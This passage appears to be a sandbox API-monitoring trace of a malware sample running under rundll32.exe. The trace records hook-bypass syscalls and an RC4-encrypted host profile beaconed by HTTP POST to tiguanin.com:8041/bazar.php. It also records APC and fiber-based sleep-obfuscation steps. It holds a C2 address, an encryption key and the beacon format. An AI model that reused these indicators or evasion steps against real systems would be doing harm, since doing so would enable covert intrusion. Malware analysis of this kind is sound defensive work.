+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F5A0 (0x000000E041C8E000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F5A8 (0xad80)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe041c84c5c]
+
+[CNT] [417]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F5A0 (0x000000E041C99000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F5A8 (0x36)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe041c84c5c]
+
+[CNT] [418]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F5A0 (0x000000E041C9A000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F5A8 (0x330)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0xe041c84c5c]
+
+[CNT] [419]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000E04227F5A0 (0x000000E041C9B000)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000E04227F5A8 (0x144)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0xe041c84c5c]
+
+[CNT] [420]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x2dc
+[RET] [0xe041c66154]
+
+[CNT] [421]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtTerminateThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0x2e0
+[PAR] NTSTATUS ExitStatus   : 0x0
+[RET] [0xe041c66165]
+
+[CNT] [422]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x2e0
+[RET] [0xe041c6616f]
+
+[CNT] [423]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x2e4
+[RET] [0xe041c68790]
+
+[CNT] [424]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <SwitchToFiber> in [KERNEL32.DLL] 
+[PAR] LPVOID lpFiber : 0x000000E03FD86F60
+[RET] [0xe041c66185]
+
+[CNT] [425]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <ConvertFiberToThread> in [KERNEL32.DLL] 
+[RET] [0xe041c68e19]
+
+[CNT] [426]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <DeleteFiber> in [KERNEL32.DLL] 
+[PAR] LPVOID lpFiber : 0x000000E03FD8D520
+[RET] [0xe041c68e22]
+
+[CNT] [427]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <ReleaseMutex> in [KERNEL32.DLL] 
+[PAR] HANDLE hMutex : 0x130
+[RET] [0xe041c632a4]
+
+[CNT] [428]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C8844A
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c83d18]
+
+[CNT] [429]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD7B7B0
+[PAR] size_t   size    : 0x4
+[PAR] wchar_t  *format : 0x000000E041C8844A
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD7B7B0
+[STR]          -> "2668"
+[RES] int 4
+
+[CNT] [430]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] wchar_t  *format : 0x000000E041C8844A
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c83d18]
+
+[CNT] [431]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnwprintf> in [ntdll.dll] 
+[PAR] wchar_t  *buffer : 0x000000E03FD7B9F0
+[PAR] size_t   size    : 0x4
+[PAR] wchar_t  *format : 0x000000E041C8844A
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c83d41]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnwprintf>
+[PAR] wchar_t  *buffer : 0x000000E03FD7B9F0
+[STR]          -> "2748"
+[RES] int 4
+
+[CNT] [432]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnprintf> in [ntdll.dll] 
+[PAR] char     *buffer : 0x0
+[PAR] size_t   size    : 0x0
+[PAR] char_t   *format : 0x000000E041C884D4
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c59448]
+
+[CNT] [433]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <_vsnprintf> in [ntdll.dll] 
+[PAR] char     *buffer : 0x000000E03FD590E0
+[PAR] size_t   size    : 0x10a
+[PAR] char_t   *format : 0x000000E041C884D4
+[PAR] va_list  argptr  : 0x000000E041D0E810
+[RET] [0xe041c5946e]
+
+[ * ] [pid 0xa6c][tid 0xabc] c:\windows\system32\rundll32.exe
+[API] <_vsnprintf>
+[PAR] char_t   *buffer : 0x000000E03FD590E0
+[STR]          -> "{"cds":{"auth":"OV1T557KBIUECUM5"},"mtdt":{"h_name":"home","wver":"x64/6.3","ip":"169.254.143.85","arch":"x64","bld":"96"
+[STR]             "00","p_name":"QwA6AFwAVwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAHIAdQBuAGQAbABsADMAMgAuAGUAeABlAA==","uid":"user","pi"
+[STR]             "d":"2668","tid":"2748"}}"
+[RES] int 266
+
+[CNT] [434]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <SystemFunction032> in [CRYPTSP.DLL] 
+[INF] [ Undocumented RC4 implementation ]
+[PAR] PBINARY_STRING buffer : 0x000000E041D0E780
+[FLD]                -> Length    = 0x10a
+[FLD]                -> MaxLength = 0x10a
+[FLD]                -> Buffer    = 0x000000E03FD96320 
+[PAR] PBINARY_STRING key    : 0x000000E041D0E770
+[FLD]                -> Length    = 0x10
+[FLD]                -> MaxLength = 0x10
+[FLD]                -> Buffer    = 0x000000E03FD5CEE0 ("S47EFEUO3D2O6641")
+[RET] [0xe041c54c35]
+
+[CNT] [435]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [436]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [437]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [438]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [439]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [440]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [441]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [442]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68079]
+
+[CNT] [443]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetOpenW> in [wininet.dll] 
+[PAR] LPCWSTR lpszAgent       : 0x000000E03FD5CDF0
+[STR]         -> "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
+[PAR] DWORD   dwAccessType    : 0x0 (INTERNET_OPEN_TYPE_PRECONFIG)
+[PAR] LPCWSTR lpszProxyName   : 0x0 (null)
+[PAR] LPCWSTR lpszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0 
+[RET] [0xe041c5788c]
+
+[CNT] [444]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetConnectW> in [wininet.dll] 
+[PAR] HINTERNET     hInternet      : 0xcc0004
+[PAR] LPCWSTR       lpszServerName : 0x000000E03FD51880 ("tiguanin.com")
+[PAR] INTERNET_PORT nServerPort    : 8041
+[PAR] LPCWSTR       lpszUsername   : 0x0 (null)
+[PAR] LPCWSTR       lpszPassword   : 0x0 (null)
+[PAR] DWORD         dwService      : 0x3 (INTERNET_SERVICE_HTTP)
+[PAR] DWORD         dwFlags        : 0x0 
+[RET] [0xe041c578d1]
+
+[CNT] [445]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <HttpOpenRequestW> in [wininet.dll] 
+[PAR] HINTERNET hConnect           : 0xcc0008
+[PAR] LPCWSTR   lpszVerb           : 0x000000E041C88F50 ("POST")
+[PAR] LPCWSTR   lpszObjectName     : 0x000000E03FD5C4A0
+[STR]           -> "/bazar.php"
+[PAR] LPCWSTR   lpszVersion        : 0x0 (null)
+[PAR] LPCWSTR   lpszReferer        : 0x0 (null)
+[PAR] LPCWSTR   *lplpszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags            : 0x84c80300 (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE)
+[RET] [0xe041c57925]
+
+[CNT] [446]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetSetOptionW> in [wininet.dll] 
+[PAR] HINTERNET hInternet      : 0xcc000c
+[PAR] DWORD     dwOption       : 0x1f (INTERNET_OPTION_SECURITY_FLAGS)
+[PAR] LPVOID    lpBuffer       : 0x000000E041D0E7A4
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] [0xe041c579a9]
+
+[CNT] [447]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <HttpSendRequestA> in [wininet.dll] 
+[PAR] HINTERNET hRequest         : 0xcc000c
+[PAR] LPCTSTR   lpszHeaders      : 0x0 (null)
+[PAR] DWORD     dwHeadersLength  : 0x0
+[PAR] LPVOID    lpOptional       : 0x000000E03FD81F30
+[STR]           -> "88ea80d0a8145617084c1971a2e5f10dafc825dfa01aa9131c31eed2159e33380dff1f6c5b2b0f95bf9e3eccd60c1d280c96fa1f4acd82ac6739fad4"
+[STR]              "6dc3ae39d58a579d7cbdc8dd1c967704a3b004fc992ed35b62fc6c335fdabf3d06f73d1be31cfa6e400611012495666f57da92a1ce53a79a2a8a3bd1"
+[STR]              "a17fa2ed8fb54d132d80e926f544078052cf155d1dfb93137bf25aff3337a6e363e7a802c276d9ed4b0d03bdb4b22fc8ce5ecaa162f5cdca8f199770"
+[STR]              "4a349921f9a0b1d11f2dd44af30628be98cea3f63a006f832b5468f7afaeb783ac1299062871d81cb499b6d15a4dbcc66ff0959fdaf1cd309dc790e0"
+[STR]              "25725ea1c95ef9ef0283f09beef05c8dc375080d6f0c71cdb1da"
+[PAR] DWORD     dwOptionalLength : 0x214
+[RET] [0xe041c579dc]
+
+[CNT] [448]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetQueryDataAvailable> in [wininet.dll] 
+[PAR] HINTERNET hFile                    : 0xcc000c
+[PAR] LPCVOID   lpBuffer                 : 0x000000E041D0E7A8
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x0
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x0
+[RET] [0xe041c57a59]
+
+[CNT] [449]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetReadFile> in [wininet.dll] 
+[PAR] HINTERNET hFile                 : 0xcc000c
+[PAR] LPVOID    lpBuffer              : 0x000000E03FD9EEB0
+[PAR] DWORD     dwNumberOfBytesToRead : 0x114
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000E041D0E7AC
+[RET] [0xe041c57a7c]
+
+[CNT] [450]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetQueryDataAvailable> in [wininet.dll] 
+[PAR] HINTERNET hFile                    : 0xcc000c
+[PAR] LPCVOID   lpBuffer                 : 0x000000E041D0E7A8
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x0
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x0
+[RET] [0xe041c57a59]
+
+[CNT] [451]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetCloseHandle> in [wininet.dll] 
+[PAR] HINTERNET  hInternet : 0xcc000c
+[RET] [0xe041c57b17]
+
+[CNT] [452]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetCloseHandle> in [wininet.dll] 
+[PAR] HINTERNET  hInternet : 0xcc0008
+[RET] [0xe041c57b25]
+
+[CNT] [453]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <InternetCloseHandle> in [wininet.dll] 
+[PAR] HINTERNET  hInternet : 0xcc0004
+[RET] [0xe041c57b33]
+
+[CNT] [454]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x000000E03FD590E0
+[STR]         -> "<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">"
+[STR]            "<html><head>"
+[STR]            "<title>404 Not Found</title>"
+[STR]            "</head><body>"
+[STR]            "<h1>Not Found</h1>"
+[STR]            "<p>The requested URL was not found on this server.</p>"
+[STR]            "<hr>"
+[STR]            "<address>Apache/2.4.58 (Ubuntu) Server at tiguanin.com Port 8041</address>"
+[STR]            "</body></html>"
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x0
+[PAR] DWORD   *pcbBinary : 0x000000E041D0E7DC
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0xe041c6be5c]
+
+[CNT] [455]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x000000E03FD590E0
+[STR]         -> "<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">"
+[STR]            "<html><head>"
+[STR]            "<title>404 Not Found</title>"
+[STR]            "</head><body>"
+[STR]            "<h1>Not Found</h1>"
+[STR]            "<p>The requested URL was not found on this server.</p>"
+[STR]            "<hr>"
+[STR]            "<address>Apache/2.4.58 (Ubuntu) Server at tiguanin.com Port 8041</address>"
+[STR]            "</body></html>"
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x000000E03FD5BF70
+[PAR] DWORD   *pcbBinary : 0x000000E041D0E7DC
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0xe041c6bea1]
+
+[CNT] [456]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <rand> in [msvcrt.dll] 
+[RET] [0xe041c68cc0]
+
+[CNT] [457]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <SystemFunction036> in [CRYPTBASE.DLL] 
+[INF] [ RtlGenRandom ]
+[PAR] PVOID RandomBuffer       : 0x000000E041D0E8C0
+[PAR] ULONG RandomBufferLength : 0x10
+[RET] [0xe041c68db2]
+
+[CNT] [458]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <ConvertThreadToFiber> in [KERNEL32.DLL] 
+[PAR] LPVOID lp[PAR] 0x0
+[RET] [0xe041c68dc5]
+
+[CNT] [459]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CreateFiber> in [KERNEL32.DLL] 
+[PAR] SIZE_T                dwStackSize    : 0x100000
+[PAR] LPFIBER_START_ROUTINE lpStartAddress : 0x000000E041C655C0
+[PAR] LPVOID                lpParameter    : 0x000000E041D0E940
+[RET] [0xe041c68e07]
+
+[CNT] [460]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <SwitchToFiber> in [KERNEL32.DLL] 
+[PAR] LPVOID lpFiber : 0x000000E03FD8DDF0
+[RET] [0xe041c68e13]
+
+[CNT] [461]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <SystemFunction036> in [CRYPTBASE.DLL] 
+[INF] [ RtlGenRandom ]
+[PAR] PVOID RandomBuffer       : 0x000000E04227F744
+[PAR] ULONG RandomBufferLength : 0x10
+[RET] [0xe041c685a6]
+
+[CNT] [462]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtCreateEvent> in [ntdll.dll] 
+[PAR] PHANDLE            EventHandle      : 0x000000E04227F720
+[PAR] ACCESS_MASK        DesiredAccess    : 0x1f0003 (EVENT_ALL_ACCESS)
+[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x0
+[PAR] EVENT_TYPE         EventType        : 0x1 (SynchronizationEvent)
+[PAR] BOOLEAN            InitialState     : 0x0
+[RET] [0xe041c840fb]
+
+[CNT] [463]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtCreateThreadEx> in [ntdll.dll] 
+[PAR] PHANDLE                        ThreadHandle      : 0x000000E04227F718
+[PAR] ACCESS_MASK                    DesiredAccess     : 0x1f03ff (THREAD_ALL_ACCESS)
+[PAR] POBJECT_ATTRIBUTES             ObjectAttributes  : 0x0
+[PAR] HANDLE                         ProcessHandle     : 0xffffffff
+[PAR] PVOID                          StartRoutine      : 0x00007FFA0361C490 (ntdll.dll!RtlInitializeResource)
+[PAR] PVOID                          Argument          : 0x0
+[PAR] ULONG                          CreateThreadFlags : 0x1 (THREAD_CREATE_FLAGS_CREATE_SUSPENDED)
+[PAR] SIZE_T                         ZeroBits          : 0x0
+[PAR] SIZE_T                         StackSize         : 0x14000
+[PAR] SIZE_T                         MaximumStackSize  : 0x14000
+[PAR] PNT_PROC_THREAD_ATTRIBUTE_LIST AttributeList     : 0x0
+[RET] [0xe041c8444e]
+
+Thread created by monitored process : Now monitoring [pid 0xa6c][tid 0xad4]
+
+[CNT] [464]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtDuplicateObject> in [ntdll.dll] 
+[PAR] HANDLE      SourceProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] HANDLE      SourceHandle        : 0xFFFFFFFFFFFFFFFE
+[PAR] HANDLE      TargetProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] PHANDLE     TargetHandle        : 0x000000E04227F788
+[PAR] ACCESS_MASK DesiredAccess       : 0x1f03ff (STANDARD_RIGHTS_ALL)
+[PAR] ULONG       Attributes          : 0x0 
+[PAR] ULONG       Options             : 0x0
+[RET] [0xe041c84684]
+
+[CNT] [465]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0x2f8
+[PAR] PCONTEXT ThreadContext : 0x000000E03FDA4EE0
+[RET] [0xe041c657eb]
+
+[CNT] [466]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <GetCurrentProcessId> in [KERNEL32.DLL] 
+[RET] [0xe041c6f3ea]
+
+[CNT] [467]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <CreateToolhelp32Snapshot> in [KERNEL32.DLL] 
+[PAR] DWORD dwFlags       : 0x4 ( TH32CS_SNAPTHREAD)
+[PAR] DWORD th32ProcessID : 0x0
+[RET] [0xe041c6f40c]
+
+[CNT] [468]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[API] <Thread32First> in [KERNEL32.DLL] 
+[RET] [0xe041c6f431]
+
+[CNT] [469]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenThread> in [ntdll.dll] 
+[PAR] PHANDLE            ThreadHandle     : 0x000000E04227F590
+[PAR] ACCESS_MASK        DesiredAccess    : 0x1f03ff (THREAD_ALL_ACCESS)
+[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x000000E04227F5C8
+[PAR] PCLIENT_ID         ClientId         : 0x000000E04227F598
+[FLD]                    -> UniqueProcess = 0xa6c
+[FLD]                    -> UniqueThread  = 0xb3c
+[RET] [0xe041c84bbb]
+
+[CNT] [470]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSuspendThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle         : 0x304
+[PAR] PULONG   PreviousSuspendCount : 0x000000E04227F57C
+[RET] [0xe041c6f4f0]
+
+[CNT] [471]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueryInformationThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle            : 0x304
+[PAR] ULONG           ThreadInformationClass  : 0x0 (ThreadBasicInformation)
+[PAR] PVOID           ThreadInformation       : 0x000000E04227F5F8
+[PAR] ULONG           ThreadInformationLength : 0x30
+[PAR] PULONG          ReturnLength            : 0x0
+[RET] [0xe041c84e6a]
+
+[CNT] [472]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtReadVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE   ProcessHandle       : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID    BaseAddress         : 0x00007FF7E42AE000
+[PAR] PVOID    Buffer              : 0x000000E04227F628
+[PAR] SIZE_T   NumberOfBytesToRead : 0x38
+[PAR] PSIZE_T  NumberOfBytesRead   : 0x0
+[RET] [0xe041c8523c]
+
+[CNT] [473]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0x304
+[PAR] PCONTEXT ThreadContext : 0x000000E03FDA0BF0
+[RET] [0xe041c6f584]
+
+[CNT] [474]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtResumeThread> in [ntdll.dll] 
+[PAR] HANDLE ThreadHandle : 0x304
+[RET] [0xe041c6f5fa]
+
+[CNT] [475]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x304
+[RET] [0xe041c6f626]
+
+[CNT] [476]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtClose> in [ntdll.dll] 
+[PAR] HANDLE    Handle  : 0x300
+[RET] [0xe041c6f62e]
+
+[CNT] [477]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD9FD50
+[RET] [0xe041c8506a]
+
+[CNT] [478]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FDA53C0
+[RET] [0xe041c8506a]
+
+[CNT] [479]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FDA58A0
+[RET] [0xe041c8506a]
+
+[CNT] [480]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD9EEB0
+[RET] [0xe041c8506a]
+
+[CNT] [481]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FD9F390
+[RET] [0xe041c8506a]
+
+[CNT] [482]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FDA6260
+[RET] [0xe041c8506a]
+
+[CNT] [483]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
+[PAR] HANDLE          ThreadHandle      : 0x2f8
+[PAR] PIO_APC_ROUTINE ApcRoutine        : 0x00007FFA03691070 (ntdll.dll!NtContinue)
+[PAR] PVOID           ApcRoutineContext : 0x000000E03FDA5D80
+[RET] [0xe041c8506a]
+
+[CNT] [484]
+[PTP] [0xa6c] [0xabc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQueueApcThread> in [ntdll.dll] 
